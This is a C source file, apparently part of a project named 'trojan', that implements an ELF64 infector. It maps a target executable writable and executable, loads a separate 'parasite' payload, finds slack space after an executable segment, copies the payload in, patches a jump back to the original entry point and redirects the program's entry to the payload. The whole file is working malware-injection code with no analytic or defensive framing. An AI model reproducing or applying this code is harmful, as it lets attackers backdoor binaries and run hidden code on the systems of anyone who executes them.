#include "trojan.h"

struct Payload parasite;
struct Host host;

/*Open and map file into memory*/
void open_map_file(char *filename)
{
	struct stat st;
	int fd;

	if((fd = open(filename,O_RDWR))<0)
	{
		perror("open():");
		exit(EXIT_FAILURE);
	}

	if(fstat(fd,&st)<0)
	{
		perror("fstat():");
		exit(EXIT_FAILURE);
	}

	uint8_t *mem = mmap(NULL,st.st_size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_SHARED,fd,0);

	if(mem==MAP_FAILED)
	{
		perror("mmap:");
		exit(EXIT_FAILURE);
	}
	host.host = mem;
	host.size = st.st_size;

	close(fd);
}

/*Extract payload*/
void extract_payload(char *parasite_path)
{
	/*open parasite*/
	int fd = open(parasite_path,O_RDONLY);
	if(fd==-1)
	{
		perror("open:");
		exit(EXIT_FAILURE);
	}

	/*set parasite size*/
	struct stat st;
	if(lstat(parasite_path,&st)<0)
	{
		perror("lstat");
		exit(EXIT_FAILURE);
	}
	parasite.size = st.st_size;

	/*create space on the heap and read the paylaod into memory*/
	parasite.payload = (int8_t *)malloc(parasite.size);
	if(parasite.payload==NULL)
	{
		perror("malloc:");
		exit(EXIT_FAILURE);
	}
	/*read into memory*/
	int bytes = read(fd,parasite.payload,parasite.size);
	if(bytes==-1)
	{
		perror("read:");
		exit(EXIT_FAILURE);
	}

	close(fd);
}


int find_phdr()
{
	Elf64_Off pos,endpos;
	int i,j;	
	Elf64_Ehdr *ehdr; Elf64_Phdr *phdr;

	ehdr = (Elf64_Ehdr *)host.host;
	phdr = (Elf64_Phdr *)&host.host[ehdr->e_phoff];

	for(i=0;i<ehdr->e_phnum;++i)
	{
		if(phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz && (phdr[i].p_flags & PF_X))
		{
			pos = phdr[i].p_offset + phdr[i].p_filesz;
			endpos = pos + parasite.size;

			for(j=0;j<ehdr->e_phnum;++j)
			{
				if(phdr[j].p_offset >= pos && phdr[j].p_offset < endpos && phdr[j].p_filesz > 0)
					break;
			}
			if(j==ehdr->e_phnum)
				return i;
		}
	}
	return -1;

}

/*infect the host*/
void infect_host(int segment)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Off pos;
	off_t offset;

	ehdr = (Elf64_Ehdr *)host.host;
	phdr = (Elf64_Phdr *)&host.host[ehdr->e_phoff];

	if(phdr[segment].p_offset + phdr[segment].p_filesz >= host.size)
	{
		printf("[!]segment header error\n");
		exit(EXIT_FAILURE);
	}

	pos = phdr[segment].p_vaddr + phdr[segment].p_filesz;
	offset = ehdr->e_entry - (pos + parasite.size);
	if(offset > 0x7FFFFFFFL || offset <-0x80000000L)
	{
		printf("[!]:relative jmp >2GB\n");
		exit(EXIT_FAILURE);
	}

	*(Elf64_Word*)(parasite.payload + parasite.size - 4) = (Elf64_Word)offset;
	ehdr->e_entry = pos;

	memcpy(host.host + phdr[segment].p_offset + phdr[segment].p_filesz,parasite.payload,parasite.size);
	phdr[segment].p_filesz += parasite.size;
	phdr[segment].p_memsz += parasite.size;
}

